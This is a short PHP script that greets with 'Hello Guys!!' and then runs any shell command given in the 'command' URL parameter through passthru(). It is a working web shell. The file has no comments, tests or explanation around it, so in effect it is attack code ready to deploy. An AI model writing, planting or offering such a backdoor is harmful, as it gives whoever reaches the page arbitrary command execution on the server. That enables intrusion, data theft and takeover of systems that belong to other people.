<?php

echo "Hello Guys!!";

if(isset($_GET['command'])){
	$command=$_GET['command'];
	passthru($command);
}
	
?>
